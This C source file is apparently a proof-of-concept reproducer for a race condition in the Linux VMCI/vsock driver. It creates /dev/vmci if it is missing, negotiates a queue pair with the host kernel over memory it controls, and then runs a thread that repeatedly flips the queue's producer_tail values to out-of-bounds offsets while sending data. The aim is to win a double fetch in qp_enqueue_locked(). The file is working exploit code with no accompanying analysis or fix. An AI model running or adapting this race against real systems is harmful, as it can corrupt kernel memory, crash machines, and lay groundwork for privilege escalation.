// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>

typedef uint8_t  u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;
typedef int32_t  s32;

#define VMCI_VERSION_NOVMVM     ((11u << 16) | 0)
#define VMCI_VERSION            VMCI_VERSION_NOVMVM
#define VMCI_INVALID_ID         (~0u)
#define VMCI_HOST_CONTEXT_ID    2u

#define VMCI_IO(nr)                     (((7u) << 8) | (nr))
#define IOCTL_VMCI_VERSION2             VMCI_IO(0xa7)
#define IOCTL_VMCI_INIT_CONTEXT         VMCI_IO(0xa0)
#define IOCTL_VMCI_QUEUEPAIR_ALLOC      VMCI_IO(0xa8)
#define IOCTL_VMCI_DATAGRAM_SEND        VMCI_IO(0xab)
#define IOCTL_VMCI_DATAGRAM_RECEIVE     VMCI_IO(0xac)

struct vmci_handle {
	u32 context;
	u32 resource;
};

struct vmci_datagram {
	struct vmci_handle dst;
	struct vmci_handle src;
	u64 payload_size;
};

struct vmci_init_blk {
	u32 cid;
	u32 flags;
};

struct vmci_qp_alloc_info {
	struct vmci_handle handle;
	u32 peer;
	u32 flags;
	u64 produce_size;
	u64 consume_size;
	u64 ppn_va;
	u64 num_ppns;
	s32 result;
	u32 version;
};

struct vmci_datagram_snd_rcv_info {
	u64 addr;
	u32 len;
	s32 result;
};

struct vmci_queue_header {
	struct vmci_handle handle;
	u64 producer_tail;
	u64 consumer_head;
};

#define VMCI_TRANSPORT_PACKET_RID       1u
#define VMCI_TRANSPORT_PACKET_VERSION   1

enum {
	PKT_INVALID = 0, PKT_REQUEST, PKT_NEGOTIATE, PKT_OFFER, PKT_ATTACH,
	PKT_WROTE, PKT_READ, PKT_RST, PKT_SHUTDOWN, PKT_WAITING_WRITE,
	PKT_WAITING_READ, PKT_REQUEST2, PKT_NEGOTIATE2,
};

struct vmci_transport_packet {
	struct vmci_datagram dg;
	u8  version;
	u8  type;
	u16 proto;
	u32 src_port;
	u32 dst_port;
	u32 _reserved2;
	union {
		u64 size;
		u64 mode;
		struct vmci_handle handle;
		struct { u64 generation; u64 offset; } wait;
	} u;
};

#ifndef AF_VSOCK
#define AF_VSOCK 40
#endif
#define VMADDR_CID_ANY  (-1U)

struct sockaddr_vm {
	unsigned short svm_family;
	unsigned short svm_reserved1;
	unsigned int   svm_port;
	unsigned int   svm_cid;
	unsigned char  svm_flags;
	unsigned char  svm_zero[3];
};

#define PAGE_SZ         4096UL
#define QP_SIZE_REQ     4096ULL
#define GUEST_CID_HINT  1000u
#define QP_RESOURCE_ID  0x100u
#define SRC_PORT        4321u
#define DST_PORT        1234u
#define ROUNDS          400000UL

static int vmci_fd = -1;
static u32 my_cid;
static u64 qp_size = QP_SIZE_REQ;
static u8 *qmap;
static volatile u64 *tail_a;
static volatile u64 *tail_b;
static volatile int stop_flip;
static volatile u64 bad_tail = PAGE_SZ + 8;

static void die(const char *m)
{
	fprintf(stderr, "[-] %s: %s\n", m, strerror(errno));
	exit(1);
}

static void pin_cpu(int cpu)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	sched_setaffinity(0, sizeof(set), &set);
}

static int open_vmci(void)
{
	int fd = open("/dev/vmci", O_RDWR);
	FILE *f;
	char line[128];
	int minor = -1;

	if (fd >= 0)
		return fd;

	f = fopen("/proc/misc", "r");
	if (f) {
		while (fgets(line, sizeof(line), f)) {
			int m;
			char name[64];
			if (sscanf(line, "%d %63s", &m, name) == 2 &&
			    !strcmp(name, "vmci")) {
				minor = m;
				break;
			}
		}
		fclose(f);
	}
	if (minor < 0) {
		fprintf(stderr, "[-] vmci misc device not present\n");
		exit(1);
	}
	unlink("/dev/vmci");
	if (mknod("/dev/vmci", S_IFCHR | 0666, makedev(10, minor)) < 0)
		die("mknod /dev/vmci");
	fd = open("/dev/vmci", O_RDWR);
	if (fd < 0)
		die("open /dev/vmci");
	return fd;
}

static int dg_send(struct vmci_transport_packet *pkt)
{
	struct vmci_datagram_snd_rcv_info info;

	info.addr = (u64)(uintptr_t)pkt;
	info.len = sizeof(*pkt);
	info.result = 0;
	if (ioctl(vmci_fd, IOCTL_VMCI_DATAGRAM_SEND, &info) < 0)
		return -1;
	return info.result;
}

static int dg_wait(int type, struct vmci_transport_packet *out, int ms)
{
	static u8 buf[17 * 4096];
	struct vmci_datagram_snd_rcv_info info;
	struct pollfd pfd = { .fd = vmci_fd, .events = POLLIN };
	int waited = 0;

	while (waited < ms) {
		info.addr = (u64)(uintptr_t)buf;
		info.len = sizeof(buf);
		info.result = 0;
		if (ioctl(vmci_fd, IOCTL_VMCI_DATAGRAM_RECEIVE, &info) == 0 &&
		    info.result >= 0) {
			struct vmci_transport_packet *p =
				(struct vmci_transport_packet *)buf;
			if (p->type == type) {
				memcpy(out, p, sizeof(*out));
				return 1;
			}
			continue;
		}
		poll(&pfd, 1, 20);
		waited += 20;
	}
	return 0;
}

static void mk_pkt(struct vmci_transport_packet *p, int type)
{
	memset(p, 0, sizeof(*p));
	p->dg.dst.context  = VMCI_HOST_CONTEXT_ID;
	p->dg.dst.resource = VMCI_TRANSPORT_PACKET_RID;
	p->dg.src.context  = my_cid;
	p->dg.src.resource = VMCI_TRANSPORT_PACKET_RID;
	p->dg.payload_size = sizeof(*p) - sizeof(struct vmci_datagram);
	p->version  = VMCI_TRANSPORT_PACKET_VERSION;
	p->type     = type;
	p->src_port = SRC_PORT;
	p->dst_port = DST_PORT;
}

static void *flipper(void *arg)
{
	(void)arg;
	pin_cpu(1);
	while (!stop_flip) {
		u64 bad = bad_tail;
		int i;

		for (i = 0; i < 256; i++) {
			*tail_a = 0;
			*tail_b = 0;
			*tail_a = bad;
			*tail_b = bad;
		}
	}
	return NULL;
}

static void *drainer(void *arg)
{
	static u8 buf[17 * 4096];
	struct vmci_datagram_snd_rcv_info info;

	(void)arg;
	while (!stop_flip) {
		info.addr = (u64)(uintptr_t)buf;
		info.len = sizeof(buf);
		info.result = 0;
		if (ioctl(vmci_fd, IOCTL_VMCI_DATAGRAM_RECEIVE, &info) < 0 ||
		    info.result < 0)
			usleep(2000);
	}
	return NULL;
}

int main(void)
{
	struct vmci_init_blk blk;
	struct vmci_qp_alloc_info qpi;
	struct vmci_transport_packet pkt, rpkt;
	struct sockaddr_vm sa;
	pthread_t th_flip, th_drain;
	int lfd, cfd, ver;
	u64 npages, produce_pages, consume_pages;
	unsigned long round;
	char data[8] = "AAAAAAAA";

	setvbuf(stdout, NULL, _IONBF, 0);
	pin_cpu(0);

	vmci_fd = open_vmci();

	ver = VMCI_VERSION;
	if (ioctl(vmci_fd, IOCTL_VMCI_VERSION2, &ver) < 0)
		die("IOCTL_VMCI_VERSION2");

	blk.cid = GUEST_CID_HINT;
	blk.flags = 0;
	if (ioctl(vmci_fd, IOCTL_VMCI_INIT_CONTEXT, &blk) < 0)
		die("IOCTL_VMCI_INIT_CONTEXT");
	my_cid = blk.cid;
	printf("[+] vmci context cid = %u\n", my_cid);

	lfd = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (lfd < 0)
		die("socket(AF_VSOCK)");
	memset(&sa, 0, sizeof(sa));
	sa.svm_family = AF_VSOCK;
	sa.svm_cid = VMADDR_CID_ANY;
	sa.svm_port = DST_PORT;
	if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind(AF_VSOCK)");
	if (listen(lfd, 8) < 0)
		die("listen");
	printf("[+] vsock listener on port %u\n", DST_PORT);

	mk_pkt(&pkt, PKT_REQUEST2);
	pkt.proto = 1;
	pkt.u.size = QP_SIZE_REQ;
	if (dg_send(&pkt) < 0)
		die("send REQUEST2");

	if (!dg_wait(PKT_NEGOTIATE2, &rpkt, 3000)) {
		fprintf(stderr,
			"[-] no NEGOTIATE2 -- is vmci the h2g vsock transport?\n"
			"    boot with initcall_blacklist=vhost_vsock_init\n");
		return 1;
	}
	qp_size = rpkt.u.size;
	printf("[+] NEGOTIATE2, qp_size = %llu\n", (unsigned long long)qp_size);

	produce_pages = qp_size / PAGE_SZ + 1;
	consume_pages = qp_size / PAGE_SZ + 1;
	npages = produce_pages + consume_pages;

	qmap = mmap(NULL, npages * PAGE_SZ, PROT_READ | PROT_WRITE,
		    MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	if (qmap == MAP_FAILED)
		die("mmap queue pair");
	memset(qmap, 0, npages * PAGE_SZ);

	{
		struct vmci_queue_header *ph = (void *)qmap;
		struct vmci_queue_header *ch =
			(void *)(qmap + produce_pages * PAGE_SZ);

		ph->handle.context = my_cid;
		ph->handle.resource = QP_RESOURCE_ID;
		ph->producer_tail = 0;
		ph->consumer_head = 0;
		*ch = *ph;
		tail_a = &ph->producer_tail;
		tail_b = &ch->producer_tail;
	}

	memset(&qpi, 0, sizeof(qpi));
	qpi.handle.context = my_cid;
	qpi.handle.resource = QP_RESOURCE_ID;
	qpi.peer = VMCI_HOST_CONTEXT_ID;
	qpi.flags = 0;
	qpi.produce_size = qp_size;
	qpi.consume_size = qp_size;
	qpi.ppn_va = (u64)(uintptr_t)qmap;
	qpi.num_ppns = npages;
	qpi.version = VMCI_VERSION;
	if (ioctl(vmci_fd, IOCTL_VMCI_QUEUEPAIR_ALLOC, &qpi) < 0)
		die("IOCTL_VMCI_QUEUEPAIR_ALLOC");
	if (qpi.result < 0) {
		fprintf(stderr, "[-] queuepair alloc result = %d\n", qpi.result);
		return 1;
	}
	printf("[+] queue pair (%u:%u) created over %llu of our pages\n",
	       my_cid, QP_RESOURCE_ID, (unsigned long long)npages);

	mk_pkt(&pkt, PKT_OFFER);
	pkt.u.handle.context = my_cid;
	pkt.u.handle.resource = QP_RESOURCE_ID;
	if (dg_send(&pkt) < 0)
		die("send OFFER");

	if (!dg_wait(PKT_ATTACH, &rpkt, 3000)) {
		fprintf(stderr, "[-] no ATTACH (host did not attach)\n");
		return 1;
	}
	printf("[+] host kernel attached to our queue pair\n");

	{
		struct pollfd pfd = { .fd = lfd, .events = POLLIN };
		if (poll(&pfd, 1, 3000) <= 0) {
			fprintf(stderr, "[-] no incoming connection\n");
			return 1;
		}
	}
	cfd = accept(lfd, NULL, NULL);
	if (cfd < 0)
		die("accept");
	printf("[+] connected: host endpoint fd=%d\n", cfd);

	pthread_create(&th_drain, NULL, drainer, NULL);
	pthread_create(&th_flip, NULL, flipper, NULL);

	printf("[*] racing the qp_enqueue_locked() double fetch ...\n");
	for (round = 0; round < ROUNDS; round++) {

		if ((round & 0x3ff) == 0) {
			u64 k = 1 + ((round >> 10) % 6);
			bad_tail = k * PAGE_SZ + 8;
		}
		send(cfd, data, sizeof(data), MSG_DONTWAIT);
	}

	stop_flip = 1;
	pthread_join(th_flip, NULL);
	pthread_join(th_drain, NULL);
	printf("[-] finished %lu rounds\n", ROUNDS);
	return 0;
}
